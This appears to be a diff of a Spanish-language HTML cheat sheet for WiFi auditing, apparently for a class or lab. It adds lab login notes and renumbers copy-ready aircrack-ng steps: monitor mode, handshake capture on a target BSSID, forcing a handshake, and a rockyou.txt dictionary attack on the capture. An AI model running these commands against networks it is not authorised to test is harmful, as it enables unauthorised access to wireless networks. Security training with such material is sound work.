@@ -23,13 +23,15 @@
     color: #38bdf8;
   }
 
-  .step {
-    background: #111827;
-    border: 1px solid #1f2933;
-    border-radius: 10px;
-    padding: 20px;
-    margin: 20px 0;
-    box-shadow: 0 0 10px rgba(0,0,0,0.4);
+.step {
+  background: #111827;
+  border: 1px solid #1f2933;
+  border-radius: 10px;
+  padding: 20px;
+  margin: 20px 0;
+  box-shadow: 0 0 10px rgba(0,0,0,0.4);
+  display: flex;
+  flex-direction: column;
   }
 
   .step h2 {
@@ -79,6 +81,13 @@
     color: #f87171;
     margin-top: 8px;
   }
+.step img {
+  width: 70%;
+  border-radius: 10px;
+  margin: 10px auto 0;
+  display: block;
+}
+  
 </style>
 </head>
 
@@ -89,15 +98,30 @@
 <h1>📡 Apuntes de Auditoría WiFi</h1>
 
 <div class="step">
+  <h2>Datos utiles</h2>
+  <li class="desc">Virtual Box con Kali Linux -> Usuario y contraseña “kali”</li>
+  <li class="desc">Notebook Depot Kali Linux -> Usuario:Depot y Pass:X</li>
+  <li class="desc">Limpiar pantalla de terminal "clear"</li>
+  <li class="desc">Ctrl + C (Interrumpir / Matar)</li>
+  <li class="desc">Ctrl + Z (Suspender / Pausar)</li>
+  <li class="desc">ls: listar o ver los archivos</li>
+  <li class="desc">ls: listar o ver los archivos</li>
+</div>
+  
+<div class="step">
+  <h2>0. Instalar Aircrack</h2>
+  <div class="code-box">
+    <button class="copy-btn" onclick="copy(this)">Copiar</button>
+    <code>sudo apt-get install aircrack-ng</code>
+  </div>
+</div>
+  
+<div class="step">
   <h2>1. Activar modo monitor</h2>
   <p class="desc">Habilita la interfaz en modo monitor.</p>
   <div class="code-box">
     <button class="copy-btn" onclick="copy(this)">Copiar</button>
     <code>sudo airmon-ng start wlan0</code>
-  </div>
-  <div class="code-box">
-    <button class="copy-btn" onclick="copy(this)">Copiar</button>
-    <code>sudo apt-get install aircrack-ng</code>
   </div>
 </div>
 
@@ -116,15 +140,11 @@
     <button class="copy-btn" onclick="copy(this)">Copiar</button>
     <code>sudo airodump-ng wlan0</code>
   </div>
+  <img src="3kali.jpg" alt="Imagen3">
 </div>
 
 <div class="step">
-  <h2>4. Salir</h2>
-  <p class="desc">CTRL + C</p>
-</div>
-
-<div class="step">
-  <h2>5. Guardar captura</h2>
+  <h2>4. Guardar captura</h2>
   <div class="code-box">
     <button class="copy-btn" onclick="copy(this)">Copiar</button>
     <code>sudo airodump-ng wlan0 -w captura</code>
@@ -132,7 +152,7 @@
 </div>
 
 <div class="step">
-  <h2>6. Filtrar red</h2>
+  <h2>5. Filtrar red</h2>
   <div class="code-box">
     <button class="copy-btn" onclick="copy(this)">Copiar</button>
     <code>sudo airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w captura wlan0</code>
@@ -140,7 +160,7 @@
 </div>
 
 <div class="step">
-  <h2>7. Forzar handshake</h2>
+  <h2>6. Forzar handshake</h2>
   <p class="desc">Abrir otra terminal.</p>
   <div class="code-box">
     <button class="copy-btn" onclick="copy(this)">Copiar</button>
@@ -149,7 +169,7 @@
 </div>
 
 <div class="step">
-  <h2>8. Verificar handshake</h2>
+  <h2>7. Verificar handshake</h2>
   <div class="code-box">
     <button class="copy-btn" onclick="copy(this)">Copiar</button>
     <code>aircrack-ng captura-02.cap</code>
@@ -157,15 +177,7 @@
 </div>
 
 <div class="step">
-  <h2>9. Listar archivos</h2>
-  <div class="code-box">
-    <button class="copy-btn" onclick="copy(this)">Copiar</button>
-    <code>ls</code>
-  </div>
-</div>
-
-<div class="step">
-  <h2>10. Diccionario</h2>
+  <h2>8. Diccionario</h2>
   <div class="code-box">
     <button class="copy-btn" onclick="copy(this)">Copiar</button>
     <code>sudo aircrack-ng -w /ruta/rockyou.txt -b [MAC_AP] captura-02.cap</code>
@@ -173,7 +185,7 @@
 </div>
 
 <div class="step">
-  <h2>11. Repetir</h2>
+  <h2>9. Repetir</h2>
   <p class="desc">Volver al paso 2 si no hay handshake.</p>
 </div>
 
